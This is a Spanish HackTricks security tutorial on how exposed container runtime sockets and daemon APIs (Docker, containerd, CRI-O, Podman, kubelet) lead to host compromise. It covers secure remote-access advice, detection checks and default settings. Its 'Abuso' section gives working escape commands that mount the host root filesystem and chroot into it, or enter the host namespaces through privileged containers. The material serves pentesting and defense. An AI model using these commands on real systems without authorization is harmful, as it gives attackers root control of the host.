# API de tiempo de ejecución y exposición del daemon

{{#include ../../../banners/hacktricks-training.md}}

## Resumen

Muchas compromisos reales en contenedores no comienzan en absoluto con un namespace escape. Comienzan con el acceso al plano de control del runtime. Si una carga de trabajo puede comunicarse con `dockerd`, `containerd`, CRI-O, Podman o kubelet a través de un socket Unix montado o un listener TCP expuesto, el atacante podría solicitar un contenedor nuevo con mayores privilegios, montar el sistema de archivos del host, unirse a los namespaces del host o recuperar información sensible del nodo. En esos casos, la API de runtime es la verdadera frontera de seguridad, y comprometerla equivale funcionalmente a comprometer el host.

Por eso la exposición del socket del runtime debe documentarse por separado de las protecciones del kernel. Un contenedor con seccomp, capabilities y confinamiento MAC ordinarios puede estar aún a una llamada de API de distancia de comprometer el host si `/var/run/docker.sock` o `/run/containerd/containerd.sock` están montados dentro de él. El aislamiento del kernel del contenedor actual puede estar funcionando exactamente como fue diseñado mientras el plano de gestión del runtime permanece totalmente expuesto.

## Modelos de acceso al daemon

Docker Engine tradicionalmente expone su API privilegiada a través del socket Unix local en `unix:///var/run/docker.sock`. Históricamente también se ha expuesto de forma remota mediante listeners TCP como `tcp://0.0.0.0:2375` o un listener protegido por TLS en `2376`. Exponer el daemon de forma remota sin TLS fuerte y autenticación de cliente convierte efectivamente la Docker API en una interfaz de root remota.

containerd, CRI-O, Podman y kubelet exponen superficies de alto impacto similares. Los nombres y flujos de trabajo difieren, pero la lógica no. Si la interfaz permite al llamante crear cargas de trabajo, montar rutas del host, recuperar credenciales o alterar contenedores en ejecución, la interfaz es un canal de gestión privilegiado y debe tratarse como tal.

Las rutas locales comunes que vale la pena comprobar son:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Las pilas más antiguas o más especializadas también pueden exponer endpoints como `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Son menos comunes en entornos modernos, pero cuando se encuentran deben tratarse con la misma precaución porque representan superficies de control en tiempo de ejecución en lugar de sockets de aplicación ordinarios.

## Acceso remoto seguro

Si un daemon debe exponerse más allá del socket local, la conexión debe protegerse con TLS y preferiblemente con autenticación mutua, de modo que el daemon verifique al cliente y el cliente verifique al daemon. La vieja costumbre de abrir el Docker daemon en HTTP sin cifrar por comodidad es uno de los errores más peligrosos en la administración de contenedores, porque la superficie de la API es lo suficientemente potente como para crear contenedores privilegiados directamente.

El patrón histórico de configuración de Docker era:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
En hosts basados en systemd, la comunicación del daemon también puede aparecer como `fd://`, lo que significa que el proceso hereda un socket preabierto de systemd en lugar de enlazarlo directamente. La lección importante no es la sintaxis exacta sino la consecuencia en seguridad. En el momento en que el daemon escucha más allá de un local socket con permisos estrictos, transport security y client authentication se vuelven obligatorias en lugar de medidas de hardening opcionales.

## Abuso

Si hay un runtime socket presente, confirma cuál es, si existe un compatible client y si es posible el acceso raw HTTP o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Estos comandos son útiles porque distinguen entre una ruta muerta, un socket montado pero inaccesible y una API privilegiada activa. Si el cliente tiene éxito, la siguiente pregunta es si la API puede lanzar un nuevo contenedor con un host bind mount o host namespace sharing.

### Ejemplo completo: Socket de Docker al root del host

Si `docker.sock` es accesible, el escape clásico es iniciar un nuevo contenedor que monte el sistema de archivos raíz del host y luego hacer `chroot` en él:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
### Ejemplo completo: Docker Socket To Host Namespaces

Esto proporciona ejecución root directa en el host a través del Docker daemon. El impacto no se limita a la lectura de archivos. Una vez dentro del nuevo contenedor, el atacante puede alterar archivos del host, obtener credenciales, implantar persistencia o iniciar cargas de trabajo adicionales con privilegios.

Si el atacante prefiere la entrada a namespaces en lugar de acceso únicamente al sistema de archivos:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Esta vía llega al host pidiendo al runtime que cree un nuevo container con exposición explícita del host-namespace en lugar de explotar el actual.

### Ejemplo completo: containerd Socket

Un socket `containerd` montado suele ser igual de peligroso:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
El impacto vuelve a ser el compromiso del host. Incluso si las herramientas específicas de Docker están ausentes, otra runtime API puede aún ofrecer el mismo poder administrativo.

## Comprobaciones

El objetivo de estas comprobaciones es responder si el container puede alcanzar algún management plane que debería haber permanecido fuera del trust boundary.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Lo interesante aquí:

- Un socket del runtime montado suele ser una primitiva administrativa directa en lugar de una mera divulgación de información.
- Un listener TCP en `2375` sin TLS debe considerarse una condición de compromiso remoto.
- Variables de entorno como `DOCKER_HOST` a menudo revelan que la carga de trabajo fue diseñada intencionalmente para comunicarse con el runtime del host.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Local Unix socket por defecto | `dockerd` escucha en el socket local y el daemon suele ejecutarse con privilegios de root | montar `/var/run/docker.sock`, exponer `tcp://...:2375`, TLS débil o ausente en `2376` |
| Podman | CLI sin daemon por defecto | No se requiere un daemon privilegiado de larga duración para uso local ordinario; los sockets API pueden seguir exponiéndose cuando `podman system service` esté habilitado | exponer `podman.sock`, ejecutar el servicio de forma amplia, uso de API con privilegios de root |
| containerd | Socket privilegiado local | API administrativa expuesta a través del socket local y normalmente consumida por herramientas de nivel superior | montar `containerd.sock`, acceso amplio con `ctr` o `nerdctl`, exponer espacios de nombres privilegiados |
| CRI-O | Socket privilegiado local | El endpoint CRI está destinado a componentes de confianza locales del nodo | montar `crio.sock`, exponer el endpoint CRI a workloads no confiables |
| Kubernetes kubelet | API de gestión local del nodo | kubelet no debería ser ampliamente accesible desde Pods; el acceso puede exponer el estado de los pods, credenciales y funciones de ejecución dependiendo de authn/authz | montar sockets o certificados del kubelet, autenticación débil del kubelet, networking del host más endpoint de kubelet accesible |
{{#include ../../../banners/hacktricks-training.md}}
